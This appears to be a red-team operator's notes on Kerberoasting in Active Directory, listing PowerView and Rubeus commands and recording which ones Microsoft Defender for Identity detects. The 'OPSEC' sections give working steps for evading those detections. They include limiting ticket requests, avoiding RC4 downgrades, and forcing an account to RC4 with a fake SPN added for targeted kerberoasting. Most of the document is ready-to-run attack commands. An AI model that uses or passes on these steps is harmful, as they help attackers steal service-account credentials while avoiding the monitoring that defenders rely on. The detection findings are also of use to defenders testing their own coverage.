# KERBEROASTING
- MDI detects Encryption Downgrade for Kerberos EType to RC4_HMAC (etype 0x17)
- MDI detects also reconnaissance for kerberoastable accounts (searching for users that have SPN using an LDAP query) 
```
# Powerview kerberoasting LDAP reconnaissance 
Get-DomainUser -SPN => MDI detected

# Rubeus kerberoasting LDAP reconnaissance
Rubeus.exe kerberoast /stats => MDI detected because of LDAP Recon

# Rubeus kerberoasting
Rubeus.exe kerberoast => MDI detected because of LDAP recon and Encryption Downgrade for Kerberos EType to RC4_HMAC
Rubeus.exe kerberoast /user:svc_mhd /simple /rc4opsec  => MDI detected because of LDAP recon
```

![](imgachments/Pasted%20image%2020260416174948.png)

![](imgachments/Pasted%20image%2020260416164907.png)

![](imgachments/Pasted%20image%2020260416112644.png)

![](imgachments/Pasted%20image%2020260416112942.png)
# OPSEC KERBEROASTING
- Fetch all users without filtering those with SPN, then find offline kerberoastable accounts with SPN  as well as their supported etypes
- Kerberoast accounts without downgrading AES-capable accounts, so MDI alert won’t trigger.
- Request one TGS ticket at a time.
```
# Opsec recon
Get-DomainUser | select samaccountname,serviceprincipalname,msds-supportedencryptiontypes

# opsec kerberoasting: specifying the spns and with /rc4opsec flag
Rubeus.exe kerberoast /spn:SVC2\srv01.yhp0w.lan /simple /nowrap /rc4opsec # the best (one TGS at a time)
Rubeus.exe kerberoast /spns:c:/users/consultant/documents/mhd/spns.txt /simple /nowrap /rc4opsec
```

![](imgachments/Pasted%20image%2020260416160418.png)

![](imgachments/Pasted%20image%2020260420174243.png)


# Opsec targeted kerberoasting (GenericWrite over a user)

- MDI have neither detected adding the SPN, nor modifying the supported encryption types
- MDI tolerates the modifications of the attributes ServicePrincipalName and msDS-SupportedEncryptionTypes

```
# Modify the supported encryption types to RC4 (0 or 4)
Set-DomainObject -Identity svc_mhd2 -Set @{'msDS-SupportedEncryptionTypes' = 0}

# Add SPN if no one
Set-DomainObject -Identity svc_mhd2 -Set @{'servicePrincipalName' = 'http/fake'}

# kerberoast
Rubeus.exe kerberoast /spn:http/fake /simple /nowrap /rc4opsec
```

![](imgachments/Pasted%20image%2020260423093633.png)

![](imgachments/Pasted%20image%2020260423093713.png)

